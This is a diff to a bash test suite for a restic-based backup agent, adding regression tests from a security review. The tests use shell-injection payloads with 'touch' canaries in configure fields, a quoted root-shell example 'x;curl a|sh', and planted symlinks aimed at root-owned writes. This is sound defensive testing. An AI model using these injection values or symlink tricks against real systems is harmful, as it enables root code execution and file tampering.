@@ -27,7 +27,13 @@
 #     a new key silently orphans every existing snapshot;
 #   • update.sh's convergence installs the agent on a box that never had one,
 #     arms its timer, and does NOT invent a repository key — a key generated
-#     with nobody watching exists on exactly one disk and is in nobody's hands.
+#     with nobody watching exists on exactly one disk and is in nobody's hands;
+#   • the shared directory is hostile ground (security review, Oct 2026): a
+#     configure payload carrying shell syntax is REJECTED and never runs,
+#     backup.env is read key by key and never sourced, a symlinked trigger /
+#     state.json / .key-reveal is never followed, an old-layout box is migrated
+#     into the root-only private directory without a second key, and
+#     uninstall.sh refuses to delete the key unattended.
 #
 # When a real `restic` is on PATH, it additionally does a genuine
 # init -> backup -> restore -> diff against a local repository.
@@ -69,7 +75,10 @@ case "\$1" in
       echo "a1b2c3d4  2026-09-03 02:40:11  suite366,postgres"
     fi ;;
   cat)       exit 0 ;;
-  backup)    case "\$*" in *--stdin*) cat >/dev/null 2>&1 || true ;; esac; exit 0 ;;
+  backup)
+    # What the agent exported, so a test can prove a credential arrives intact.
+    [[ -n "\${AWS_SECRET_ACCESS_KEY:-}" ]] && printf '%s' "\$AWS_SECRET_ACCESS_KEY" > "$WORK/restic.secret"
+    case "\$*" in *--stdin*) cat >/dev/null 2>&1 || true ;; esac; exit 0 ;;
   forget)    exit 0 ;;
   stats)     echo "Total Size: 1.234 GiB" ;;
   restore)
@@ -104,6 +113,12 @@ cat > "$BIN/k3s" <<EOF
 shift   # drop "kubectl"
 args="\$*"
 echo "\$args" >> "$KLOG"
+# The secret patch arrives through --patch-file (never on the argv): log its
+# body on a line of its own so the ordering and content checks still see it.
+if [[ "\$args" == *"patch secret"* ]]; then
+  pf=""; prev=""; for a in "\$@"; do [[ "\$prev" == "--patch-file" ]] && pf="\$a"; prev="\$a"; done
+  [[ -n "\$pf" ]] && echo "patch secret body: \$(cat "\$pf")" >> "$KLOG"
+fi
 case "\$args" in
   *"get deploy -o name"*)
     printf '%s\\n' deployment.apps/drive-app deployment.apps/drive-postgres \\
@@ -157,6 +172,9 @@ export DATA_DIR="$DATA"
 export BACKUP_DIR="$DATA/backup"
 export RESTIC_BIN="$BIN/restic"
 mkdir -p "$BACKUP_DIR"
+# Root-only sibling of the shared directory: backup.env, repo.pass, the lock
+# and the caches live here since the Oct 2026 review (backup.sh header).
+PRIV="$DATA/backup-private"
 
 bk() { "$DATA/backup.sh" "$@" >"$WORK/out" 2>&1 </dev/null; }
 out() { cat "$WORK/out"; }
@@ -164,7 +182,8 @@ state() { cat "$BACKUP_DIR/state.json" 2>/dev/null; }
 field() { sed -n "s/.*\"$1\": *\"\\([^\"]*\\)\".*/\\1/p" "$BACKUP_DIR/state.json" | head -1; }
 
 write_env() { # write_env REPO
-  cat > "$BACKUP_DIR/backup.env" <<EOF
+  mkdir -p "$PRIV"
+  cat > "$PRIV/backup.env" <<EOF
 BACKUP_REPO=$1
 BACKUP_S3_ACCESS_KEY=AKIAtest
 BACKUP_S3_SECRET_KEY=secrettest
@@ -174,11 +193,11 @@ BACKUP_KEEP_MONTHLY=6
 NAMESPACE=suite366
 RESTIC_BIN=$BIN/restic
 EOF
-  chmod 0600 "$BACKUP_DIR/backup.env"
+  chmod 0600 "$PRIV/backup.env"
 }
 
 echo "== unconfigured appliance =="
-rm -f "$BACKUP_DIR/backup.env" "$BACKUP_DIR/repo.pass"
+rm -f "$PRIV/backup.env" "$PRIV/repo.pass"
 bk run; rc=$?
 check "run on an unconfigured box exits 0 (timer stays green)" "$rc" "0"
 contains "state says unconfigured" '"configured": false' "$(state)"
@@ -187,7 +206,7 @@ bk status; check "status exits non-zero when unconfigured" "$?" "1"
 bk init;   check "init refuses without a destination" "$?" "1"
 
 echo "== configured appliance =="
-printf 'test-encryption-key\n' > "$BACKUP_DIR/repo.pass"; chmod 0600 "$BACKUP_DIR/repo.pass"
+printf 'test-encryption-key\n' > "$PRIV/repo.pass"; chmod 0600 "$PRIV/repo.pass"
 write_env "s3:s3.example.com/bucket/spark-01"
 : > "$RLOG"
 bk run; rc=$?
@@ -200,6 +219,7 @@ contains "minio EXCLUDES .minio.sys"              "--exclude $MINIO_DATA/.minio.
 contains "minio EXCLUDES .rustfs.sys"             "--exclude $MINIO_DATA/.rustfs.sys" "$log"
 contains "config snapshot excludes models/"       "--exclude $DATA/models" "$log"
 contains "config snapshot excludes the whole backup dir" "--exclude $BACKUP_DIR" "$log"
+contains "…and the private one (key, credentials, cache)" "--exclude $PRIV" "$log"
 # The three that were actually swept in on a real appliance. Asserted by name
 # rather than by the directory alone, so a future change that goes back to
 # per-file exclusions fails here instead of on someone's box.
@@ -289,24 +309,24 @@ contains "and names both missing pieces" "no destination and no repository key" 
 printf '%s\n' '{"repository":"/var/tmp/k/repo","requested_by":"admin@acme.tld"}' \
   > "$KWORK/opt/suite366/backup/configure-requested"
 kb handle-trigger configure
-[[ -s "$KWORK/opt/suite366/backup/repo.pass" ]] \
+[[ -s "$KWORK/opt/suite366/backup-private/repo.pass" ]] \
   && ok "configuring from the UI generates the repository key" \
   || ko "configuring from the UI generates the repository key" "$(cat "$WORK/kout")"
 contains "the key is revealed to the UI exactly once" '"key_reveal": "' "$(kstate)"
 revealed="$(python3 -c "import json,sys;print(json.load(sys.stdin)['key_reveal'])" <<<"$(kstate)" 2>/dev/null)"
-[[ -n "$revealed" && "$revealed" == "$(cat "$KWORK/opt/suite366/backup/repo.pass")" ]] \
+[[ -n "$revealed" && "$revealed" == "$(cat "$KWORK/opt/suite366/backup-private/repo.pass")" ]] \
   && ok "and it is the key actually in use" || ko "and it is the key actually in use"
 check "the reveal file is not world readable" \
   "$(stat -c '%a' "$KWORK/opt/suite366/backup/.key-reveal")" "640"
 
 # Reconfiguring must NOT mint a second key: that silently orphans every
 # existing snapshot while the old key becomes the only way to read them.
-before="$(cat "$KWORK/opt/suite366/backup/repo.pass")"
+before="$(cat "$KWORK/opt/suite366/backup-private/repo.pass")"
 printf '%s\n' '{"repository":"/var/tmp/k/repo2","requested_by":"admin@acme.tld"}' \
   > "$KWORK/opt/suite366/backup/configure-requested"
 kb handle-trigger configure
 check "reconfiguring does not mint a second key" \
-  "$(cat "$KWORK/opt/suite366/backup/repo.pass")" "$before"
+  "$(cat "$KWORK/opt/suite366/backup-private/repo.pass")" "$before"
 
 # Acknowledged = gone, and never shown again.
 : > "$KWORK/opt/suite366/backup/ack-key-requested"
@@ -408,6 +428,13 @@ klog="$(cat "$KLOG")"
 contains "it takes a pre-restore snapshot" "pre-restore" "$(cat "$RLOG")"
 contains "it patches AUTH_SECRET" "patch secret secret-drive-app" "$klog"
 contains "it carries the legacy key too" "NEXTAUTH_SECRET" "$klog"
+# The argv of `kubectl patch` is readable by every local process for as long
+# as it runs: the value travels in a 0600 file, never on the command line.
+absent  "AUTH_SECRET's value is never on kubectl's argv" "b2xkLWF1dGgtc2VjcmV0" \
+        "$(grep 'patch secret' "$KLOG" | grep -v 'body:' || true)"
+contains "it is passed with --patch-file" "--patch-file" "$klog"
+[[ -z "$(find "$PRIV" -maxdepth 1 -name 'patch.*' 2>/dev/null)" ]] \
+  && ok "the patch file does not outlive the restore" || ko "the patch file does not outlive the restore"
 # Scoped to the patch calls: POSTGRES_PASSWORD legitimately appears in the
 # pg_restore command line (the pod reads it from its own environment).
 absent  "it does NOT restore POSTGRES_PASSWORD" "POSTGRES_PASSWORD" \
@@ -451,7 +478,7 @@ contains "it points at the way back" "pre-restore" "$(out)"
 unset MINIO_PVC
 
 echo "== concurrent runs =="
-( flock 9; sleep 3 ) 9>"$BACKUP_DIR/.lock" &
+( flock 9; sleep 3 ) 9>"$PRIV/.lock" &
 holder=$!
 sleep 0.3
 bk run
@@ -464,19 +491,19 @@ cfg() { # cfg JSON -> runs the configure trigger
   printf '%s\n' "$1" > "$BACKUP_DIR/configure-requested"
   "$DATA/backup.sh" handle-trigger configure >"$WORK/out" 2>&1 </dev/null
 }
-key_before="$(sha256sum "$BACKUP_DIR/repo.pass" | awk '{print $1}')"
+key_before="$(sha256sum "$PRIV/repo.pass" | awk '{print $1}')"
 
 # THE path a new appliance actually takes: an admin configures a destination on
 # a box that has never had a backup.env. Every other test in this file writes
 # one first, which is exactly why this went unnoticed until it died inside a
 # systemd unit on real hardware.
-command rm -f "$BACKUP_DIR/backup.env"
+command rm -f "$PRIV/backup.env"
 cfg '{"repository":"/var/tmp/first-run/repo","requested_by":"admin@acme.tld"}'
 check "the FIRST configuration, with no backup.env, succeeds" "$?" "0"
 contains "and writes the destination" "BACKUP_REPO=/var/tmp/first-run/repo" \
-  "$(cat "$BACKUP_DIR/backup.env" 2>/dev/null)"
+  "$(cat "$PRIV/backup.env" 2>/dev/null)"
 contains "with empty credentials rather than an unbound variable" \
-  "BACKUP_S3_ACCESS_KEY=" "$(cat "$BACKUP_DIR/backup.env" 2>/dev/null)"
+  "BACKUP_S3_ACCESS_KEY=" "$(cat "$PRIV/backup.env" 2>/dev/null)"
 
 # A repository string that is not a restic backend must never reach
 # RESTIC_REPOSITORY: that variable is read by a process running as root.
@@ -491,7 +518,7 @@ done
 
 cfg '{"repository":"s3:s3.fr-par.scw.cloud/bucket/box-1","access_key":"AK","secret_key":"SK","region":"fr-par","keep_daily":14,"keep_weekly":8,"keep_monthly":12,"schedule":"03:15","requested_by":"admin@acme.tld"}'
 check "a valid destination is accepted" "$?" "0"
-env_file="$BACKUP_DIR/backup.env"
+env_file="$PRIV/backup.env"
 check "backup.env is 0600 (the pod runs as 1001 and must not read it back)" \
   "$(stat -c '%a' "$env_file")" "600"
 contains "the repository is written" "BACKUP_REPO=s3:s3.fr-par.scw.cloud/bucket/box-1" "$(cat "$env_file")"
@@ -499,7 +526,7 @@ contains "retention is written"      "BACKUP_KEEP_DAILY=14" "$(cat "$env_file")"
 contains "the schedule is written"   "BACKUP_SCHEDULE=03:15" "$(cat "$env_file")"
 check "the trigger file is consumed" "$([[ -e "$BACKUP_DIR/configure-requested" ]] && echo present || echo gone)" "gone"
 check "the encryption key is NOT regenerated" \
-  "$(sha256sum "$BACKUP_DIR/repo.pass" | awk '{print $1}')" "$key_before"
+  "$(sha256sum "$PRIV/repo.pass" | awk '{print $1}')" "$key_before"
 contains "the timer is re-armed at the new time" "OnCalendar=*-*-* 03:15:00" \
   "$(cat "$SYSTEMD_DIR/suite366-backup.timer")"
 for k in run test configure; do
@@ -539,6 +566,269 @@ touch "$BACKUP_DIR/run-requested"
 check "the run trigger is consumed" \
   "$([[ -e "$BACKUP_DIR/run-requested" ]] && echo present || echo gone)" "gone"
 contains "and a run really happened" "backup" "$(cat "$RLOG")"
+
+echo "== the configure payload cannot run anything as root =="
+# Security review, Oct 2026: only `repository` was validated. The access key,
+# the secret and the region went into backup.env UNQUOTED, and backup.env was
+# `source`d by root at the next run — `"secret_key": "x;curl a|sh"` was a root
+# shell. Every payload below carries its own canary: a `touch` that leaves a
+# file behind if anything ever executes it.
+env_sha_before="$(sha256sum "$env_file" | awk '{print $1}')"
+i=0
+for inj in "x;touch $WORK/pwned-semi" "\$(touch $WORK/pwned-subst)" "a b" "\`touch $WORK/pwned-tick\`" "x'y" 'x\"y'; do
+  i=$((i+1))
+  for fld in secret_key access_key; do
+    cfg "{\"repository\":\"s3:s3.fr-par.scw.cloud/bucket/box-1\",\"$fld\":\"$inj\",\"requested_by\":\"a@b.c\"}"
+    rc=$?
+    if [[ $rc -ne 0 ]] && grep -q 'refusing the configuration' "$WORK/out"; then
+      ok "$fld payload #$i is rejected"
+    else
+      ko "$fld payload #$i is rejected" "rc=$rc: $(out)"
+    fi
+  done
+done
+cfg '{"repository":"s3:s3.fr-par.scw.cloud/bucket/box-1","region":"fr-par;touch pwned-region","requested_by":"a@b.c"}'
+[[ $? -ne 0 ]] && grep -q 'refusing the configuration' "$WORK/out" \
+  && ok "a region with a shell metacharacter is rejected" || ko "a region with a shell metacharacter is rejected" "$(out)"
+check "backup.env is byte-identical after every rejection" \
+  "$(sha256sum "$env_file" | awk '{print $1}')" "$env_sha_before"
+if compgen -G "$WORK/pwned-*" >/dev/null; then
+  ko "no payload was ever executed" "$(ls "$WORK"/pwned-*)"
+else
+  ok "no payload was ever executed"
+fi
+contains "the rejection reaches the UI (state.json)" '"error": "rejected: region' "$(state)"
+absent   "…without echoing the refused value into a world-readable file" "touch pwned" "$(state)"
+
+# The characters a real S3 secret DOES carry have to survive the round trip:
+# the allow-list, the plain KEY=value write, and the key-by-key read that
+# replaced `source` — all the way into restic's environment.
+cfg '{"repository":"s3:s3.fr-par.scw.cloud/bucket/box-1","access_key":"SCW/AK+1=","secret_key":"ab/cd+ef==","region":"fr-par","requested_by":"a@b.c"}'
+check "a secret made of base64 punctuation is accepted" "$?" "0"
+contains "and written as it was given" "BACKUP_S3_SECRET_KEY=ab/cd+ef==" "$(cat "$env_file")"
+contains "the access key too" "BACKUP_S3_ACCESS_KEY=SCW/AK+1=" "$(cat "$env_file")"
+command rm -f "$WORK/restic.secret"
+bk run
+check "and it reaches restic unchanged at the next run" "$(cat "$WORK/restic.secret" 2>/dev/null)" "ab/cd+ef=="
+
+# backup.env is never sourced: a hand-edited file keeps working (its outer
+# quotes are dropped), and a line that only `source` would have executed is
+# ignored. The canary here is a file that must NOT appear.
+cat > "$env_file" <<'EOF'
+# an operator's hand edit
+BACKUP_REPO="s3:s3.example.com/bucket/spark-01"
+BACKUP_S3_ACCESS_KEY='AKIAtest'
+BACKUP_S3_SECRET_KEY="quoted secret"
+EVIL=$(touch pwned-source)
+BACKUP_KEEP_DAILY=7
+EOF
+command rm -f "$WORK/restic.secret"
+( cd "$WORK" && bk run )
+check "a hand-quoted value is read without its quotes" "$(cat "$WORK/restic.secret" 2>/dev/null)" "quoted secret"
+[[ -e "$WORK/pwned-source" ]] && ko "backup.env is read, never sourced" "the \$(…) line ran" \
+  || ok "backup.env is read, never sourced"
+contains "and the quoted destination is the one used" '"repository": "s3:s3.example.com/bucket/spark-01"' "$(state)"
+
+echo "== the shared directory is hostile ground =="
+# The pod has write access to $BACKUP_DIR. Everything root reads from there
+# must be moved out of its reach and checked first; everything root writes
+# there must be prepared elsewhere and renamed over — a symlink of the right
+# name made `cat >` and `chmod` act, as root, on whatever it pointed at.
+write_env "s3:s3.example.com/bucket/spark-01"
+
+# A trigger that is a symlink: refused unread, removed, target untouched.
+printf '%s\n' '{"repository":"/var/tmp/via-symlink","requested_by":"a@b.c"}' > "$WORK/symlink-target.json"
+ln -sfn "$WORK/symlink-target.json" "$BACKUP_DIR/configure-requested"
+"$DATA/backup.sh" handle-trigger configure >"$WORK/out" 2>&1 </dev/null; rc=$?
+check "a symlinked trigger is refused" "$rc" "1"
+contains "and says why" "not a regular file" "$(out)"
+[[ ! -e "$BACKUP_DIR/configure-requested" && ! -L "$BACKUP_DIR/configure-requested" ]] \
+  && ok "the symlink is removed from the shared directory" || ko "the symlink is removed from the shared directory"
+[[ -f "$WORK/symlink-target.json" ]] && grep -q via-symlink "$WORK/symlink-target.json" \
+  && ok "its target is untouched" || ko "its target is untouched"
+absent "and the destination it named was never configured" "via-symlink" "$(cat "$env_file")"
+
+# A trigger that is a directory: `rm -f` left it there and the .path unit
+# fired forever. Consumed (moved out, deleted), and the run still happens.
+mkdir -p "$BACKUP_DIR/run-requested/sub"; : > "$RLOG"
+"$DATA/backup.sh" handle-trigger run >"$WORK/out" 2>&1 </dev/null
+[[ ! -e "$BACKUP_DIR/run-requested" ]] && ok "a directory dropped as a trigger is consumed" \
+  || ko "a directory dropped as a trigger is consumed"
+contains "and the run still happens" "backup" "$(cat "$RLOG")"
+
+# A trigger larger than any request: refused unread.
+head -c 70000 /dev/zero | tr '\0' x > "$BACKUP_DIR/configure-requested"
+"$DATA/backup.sh" handle-trigger configure >"$WORK/out" 2>&1 </dev/null; rc=$?
+check "an oversized trigger is refused" "$rc" "1"
+contains "and says why" "larger than 64 KiB" "$(out)"
+[[ ! -e "$BACKUP_DIR/configure-requested" ]] && ok "and removed" || ko "and removed"
+
+# state.json / state.json.tmp as symlinks: root must not write through them.
+echo do-not-touch > "$WORK/victim-state"; echo do-not-touch > "$WORK/victim-tmp"
+ln -sfn "$WORK/victim-state" "$BACKUP_DIR/state.json"
+ln -sfn "$WORK/victim-tmp"   "$BACKUP_DIR/state.json.tmp"
+bk run; rc=$?
+check "a run with a symlinked state.json still succeeds" "$rc" "0"
+check "the file state.json pointed at is untouched" "$(cat "$WORK/victim-state")" "do-not-touch"
+check "the file state.json.tmp pointed at is untouched" "$(cat "$WORK/victim-tmp")" "do-not-touch"
+[[ ! -L "$BACKUP_DIR/state.json" && -f "$BACKUP_DIR/state.json" ]] \
+  && ok "state.json is a regular file again (the symlink was replaced, not followed)" \
+  || ko "state.json is a regular file again (the symlink was replaced, not followed)"
+[[ -L "$BACKUP_DIR/state.json.tmp" ]] && ok "state.json.tmp was never written at all" \
+  || ko "state.json.tmp was never written at all"
+command rm -f "$BACKUP_DIR/state.json.tmp"
+
+# .key-reveal as a symlink to the key itself: the pod re-reading a key it
+# acknowledged — or /etc/shadow — through state.json, which it can read.
+ln -sfn "$PRIV/repo.pass" "$BACKUP_DIR/.key-reveal"
+bk run
+check "a symlinked .key-reveal is not read into state.json" "$(field key_reveal)" ""
+absent "…so the repository key never reaches the shared directory" "test-encryption-key" "$(state)"
+command rm -f "$BACKUP_DIR/.key-reveal"
+
+# …and when the agent itself writes .key-reveal, a planted symlink of that
+# name must not be followed either (the keyui box has no key yet).
+K2="$WORK/keyui2"; mkdir -p "$K2/opt/suite366/backup" "$K2/systemd"
+install -m 0700 "$REPO/backup.sh" "$K2/opt/suite366/backup.sh"
+echo do-not-touch > "$K2/victim"
+ln -sfn "$K2/victim" "$K2/opt/suite366/backup/.key-reveal"
+printf '%s\n' '{"repository":"/var/tmp/k2/repo","requested_by":"admin@acme.tld"}' \
+  > "$K2/opt/suite366/backup/configure-requested"
+DATA_DIR="$K2/opt/suite366" BACKUP_DIR="$K2/opt/suite366/backup" SYSTEMD_DIR="$K2/systemd" \
+  RESTIC_BIN="$BIN/restic" "$K2/opt/suite366/backup.sh" handle-trigger configure >"$WORK/out" 2>&1 </dev/null
+check "the key reveal does not write through a planted symlink" "$(cat "$K2/victim")" "do-not-touch"
+[[ ! -L "$K2/opt/suite366/backup/.key-reveal" && -f "$K2/opt/suite366/backup/.key-reveal" ]] \
+  && ok "the reveal is a regular file in its place" || ko "the reveal is a regular file in its place"
+check "with the mode set before it got there" "$(stat -c '%a' "$K2/opt/suite366/backup/.key-reveal")" "640"
+check "and the key is in the private directory, 0600" \
+  "$(stat -c '%a' "$K2/opt/suite366/backup-private/repo.pass" 2>/dev/null)" "600"
+[[ -z "$(find "$K2/opt/suite366/backup-private" -mindepth 1 -maxdepth 1 \
+          ! -name backup.env ! -name repo.pass ! -name cache)" ]] \
+  && ok "nothing else is left behind in the private directory" \
+  || ko "nothing else is left behind in the private directory" "$(ls -A "$K2/opt/suite366/backup-private")"
+
+echo "== a box with the old layout is migrated =="
+# backup.env and repo.pass used to live in the shared directory. The first run
+# of this agent moves them — it must not generate a second key, must not lose
+# the destination, and must not adopt a file the pod put there.
+MWORK="$WORK/migrate"; mkdir -p "$MWORK/opt/suite366/backup/cache" "$MWORK/systemd"
+MB="$MWORK/opt/suite366/backup"; MP="$MWORK/opt/suite366/backup-private"
+install -m 0700 "$REPO/backup.sh" "$MWORK/opt/suite366/backup.sh"
+cat > "$MB/backup.env" <<EOF
+BACKUP_REPO=s3:s3.example.com/bucket/old-box
+BACKUP_S3_ACCESS_KEY=AKIAold
+BACKUP_S3_SECRET_KEY=old/secret+key==
+RESTIC_BIN=$BIN/restic
+EOF
+printf 'legacy-key\n' > "$MB/repo.pass"; chmod 0600 "$MB/repo.pass" "$MB/backup.env"
+: > "$MB/.lock"; echo stale > "$MB/cache/index"
+mb() { DATA_DIR="$MWORK/opt/suite366" BACKUP_DIR="$MB" SYSTEMD_DIR="$MWORK/systemd" RESTIC_BIN="$BIN/restic" \
+       "$MWORK/opt/suite366/backup.sh" "$@" >"$WORK/mout" 2>&1 </dev/null; }
+command rm -f "$WORK/restic.secret"
+mb run; rc=$?
+check "a box with the old layout still runs" "$rc" "0"
+[[ -f "$MP/backup.env" ]] && ok "backup.env moved into backup-private/" || ko "backup.env moved into backup-private/" "$(cat "$WORK/mout")"
+[[ -f "$MP/repo.pass" ]]   && ok "repo.pass moved into backup-private/"  || ko "repo.pass moved into backup-private/"
+check "the moved key is the SAME key (no second key minted)" "$(cat "$MP/repo.pass" 2>/dev/null)" "legacy-key"
+check "and it is 0600" "$(stat -c '%a' "$MP/repo.pass" 2>/dev/null)" "600"
+check "the private directory is 0700" "$(stat -c '%a' "$MP")" "700"
+[[ ! -e "$MB/backup.env" && ! -e "$MB/repo.pass" && ! -e "$MB/cache" && ! -e "$MB/.lock" ]] \
+  && ok "nothing secret is left in the shared directory" \
+  || ko "nothing secret is left in the shared directory" "$(ls -A "$MB")"
+contains "the migrated destination is the one used" '"repository": "s3:s3.example.com/bucket/old-box"' "$(cat "$MB/state.json")"
+check "the migrated secret reaches restic" "$(cat "$WORK/restic.secret" 2>/dev/null)" "old/secret+key=="
+mb run; check "a second run is idempotent" "$?" "0"
+# What the pod put there is not ours. A symlink named backup.env in the
+# shared directory is removed, and the destination it carried is never used.
+printf 'BACKUP_REPO=/evil\n' > "$WORK/evil.env"
+ln -sfn "$WORK/evil.env" "$MB/backup.env"
+mb run
+[[ ! -e "$MB/backup.env" && ! -L "$MB/backup.env" ]] \
+  && ok "a symlinked backup.env in the shared directory is removed" \
+  || ko "a symlinked backup.env in the shared directory is removed"
+contains "…and said so" "not a file this agent wrote" "$(cat "$WORK/mout")"
+contains "…and not adopted" '"repository": "s3:s3.example.com/bucket/old-box"' "$(cat "$MB/state.json")"
+[[ -f "$WORK/evil.env" ]] && ok "its target is untouched" || ko "its target is untouched"
+
+# install.sh's own key provisioning (lib/backup.sh): the same migration on a
+# re-install, and the key is no longer printed — an install log is pasted into
+# tickets as a matter of routine, and that is how a key that must exist in
+# exactly two places ends up in a third.
+prov() { # prov ENV... -> provision_backup_key's output
+  env "$@" bash -c '
+    set -uo pipefail
+    c_b=""; c_y=""; c_0=""
+    info() { printf "    %s\n" "$*"; }
+    warn() { printf "!!  %s\n" "$*"; }
+    tty_usable() { return 1; }
+    eval "$(sed -n "/^provision_backup_key() {/,/^}/p" "$1")"
+    provision_backup_key
+  ' _ "$REPO/lib/backup.sh" 2>&1
+}
+PW="$WORK/prov"; mkdir -p "$PW/backup" "$PW/backup-private"
+printf 'legacy-install-key\n' > "$PW/backup/repo.pass"; chmod 0600 "$PW/backup/repo.pass"
+o="$(prov BACKUP_DIR="$PW/backup" BACKUP_PRIVATE_DIR="$PW/backup-private" BACKUP_PASSWORD="" ASSUME_YES=1)"
+check "a re-install moves the legacy key rather than minting one" "$(cat "$PW/backup-private/repo.pass" 2>/dev/null)" "legacy-install-key"
+[[ ! -e "$PW/backup/repo.pass" ]] && ok "and leaves nothing in the shared directory" || ko "and leaves nothing in the shared directory"
+contains "and reports the fingerprint" "fingerprint" "$o"
+command rm -f "$PW/backup-private/repo.pass"
+o="$(prov BACKUP_DIR="$PW/backup" BACKUP_PRIVATE_DIR="$PW/backup-private" BACKUP_PASSWORD="" ASSUME_YES=1)"
+newkey="$(cat "$PW/backup-private/repo.pass" 2>/dev/null)"
+[[ -n "$newkey" ]] && ok "a fresh install generates a key in the private directory" \
+  || ko "a fresh install generates a key in the private directory" "$o"
+absent   "the key itself is NOT printed" "$newkey" "$o"
+contains "its fingerprint is" "fingerprint : $(sha256sum "$PW/backup-private/repo.pass" | cut -c1-12)" "$o"
+contains "and so is where to read it" "sudo cat $PW/backup-private/repo.pass" "$o"
+
+echo "== uninstall refuses to delete the key unattended =="
+# `curl … | sudo ASSUME_YES=1 bash` is the documented form, and it deleted the
+# only copy of the repository key with no warning at all: the warning lived
+# in the interactive branch. The functions are pulled out of uninstall.sh
+# verbatim; nothing else of the uninstaller runs here.
+unin() { # unin ENV... -> confirm's output ; exit status = confirm's
+  env "$@" bash -c '
+    set -uo pipefail
+    c_b=""; c_g=""; c_y=""; c_r=""; c_0=""
+    log()  { printf "==> %s\n" "$*"; }
+    warn() { printf "!!  %s\n" "$*"; }
+    die()  { printf "xx  %s\n" "$*" >&2; exit 1; }
+    tty_usable() { return 1; }
+    MODELS_DIR="$DATA_DIR/models"; SUITE_IFACE=suite0
+    KEEP_K3S=0; PRUNE_IMAGES=0; KEEP_MODELS=0
+    ASSUME_YES="${ASSUME_YES:-0}"; KEEP_DATA="${KEEP_DATA:-0}"
+    I_HAVE_THE_BACKUP_KEY="${I_HAVE_THE_BACKUP_KEY:-0}"
+    for fn in backup_key_file backup_env_file warn_backup_key confirm; do
+      eval "$(sed -n "/^$fn() {/,/^}/p" "$1")"
+    done
+    confirm
+  ' _ "$REPO/uninstall.sh" 2>&1
+}
+UW="$WORK/unin"; mkdir -p "$UW/backup-private" "$UW/backup"
+printf 'k\n' > "$UW/backup-private/repo.pass"
+printf 'BACKUP_REPO=s3:s3.example.com/bucket/box\n' > "$UW/backup-private/backup.env"
+o="$(unin DATA_DIR="$UW" ASSUME_YES=1)"; rc=$?
+check "ASSUME_YES=1 alone is refused when a key exists" "$rc" "1"
+contains "and names the key file" "$UW/backup-private/repo.pass is about to be deleted" "$o"
+contains "and the repository that becomes unreadable" "s3:s3.example.com/bucket/box" "$o"
+contains "and the way out" "I_HAVE_THE_BACKUP_KEY=1" "$o"
+o="$(unin DATA_DIR="$UW" ASSUME_YES=1 I_HAVE_THE_BACKUP_KEY=1)"; rc=$?
+check "ASSUME_YES=1 I_HAVE_THE_BACKUP_KEY=1 proceeds" "$rc" "0"
+contains "still warning" "about to be deleted" "$o"
+o="$(unin DATA_DIR="$UW" ASSUME_YES=1 KEEP_DATA=1)"; rc=$?
+check "ASSUME_YES=1 KEEP_DATA=1 proceeds (the key stays)" "$rc" "0"
+absent "without a warning about a deletion that will not happen" "about to be deleted" "$o"
+# The legacy location counts too: a box whose agent never ran since the move.
+command rm -f "$UW/backup-private/repo.pass"; printf 'k\n' > "$UW/backup/repo.pass"
+o="$(unin DATA_DIR="$UW" ASSUME_YES=1)"; rc=$?
+check "a key still in the old location is protected the same way" "$rc" "1"
+contains "and named where it is" "$UW/backup/repo.pass is about to be deleted" "$o"
+command rm -f "$UW/backup/repo.pass"
+o="$(unin DATA_DIR="$UW" ASSUME_YES=1)"; rc=$?
+check "with no key anywhere, ASSUME_YES=1 proceeds as before" "$rc" "0"
+o="$(unin DATA_DIR="$UW")"; rc=$?
+check "interactive without a TTY is still refused" "$rc" "1"
+contains "and says so" "No TTY" "$o"
+
 unset SYSTEMD_DIR
 
 echo "== update.sh converges the backup agent =="
@@ -586,6 +876,7 @@ converge() { # converge FUNC EXTRA_ENV...
 
 CSYSD="$CONV/systemd"; mkdir -p "$CSYSD"
 CENV=(DATA_DIR="$CDATA" BACKUP_AGENT="$CDATA/backup.sh" BACKUP_DIR="$CDATA/backup"
+      BACKUP_PRIVATE_DIR="$CDATA/backup-private"
       BACKUP_URL="http://x/backup.sh" RESTIC_BIN="$BIN/restic" SELF_UPDATE=1
       SYSTEMD_DIR="$CSYSD" PATH="$BIN:$PATH")
 
@@ -602,7 +893,7 @@ contains "it arms the timer on first install" "arming its timer" "$o"
 [[ -f "$CSYSD/suite366-backup.timer" && -f "$CSYSD/suite366-backup-run.path" ]] \
   && ok "the timer and trigger units really exist" \
   || ko "the timer and trigger units really exist"
-[[ ! -e "$CDATA/backup/repo.pass" ]] && ok "convergence does NOT invent a repository key" \
+[[ ! -e "$CDATA/backup/repo.pass" && ! -e "$CDATA/backup-private/repo.pass" ]] && ok "convergence does NOT invent a repository key" \
   || ko "convergence does NOT invent a repository key" "a key appeared"
 contains "it says backups are not configured" "NOT configured" "$o"
 check "the installed agent is byte-identical to the served one" \
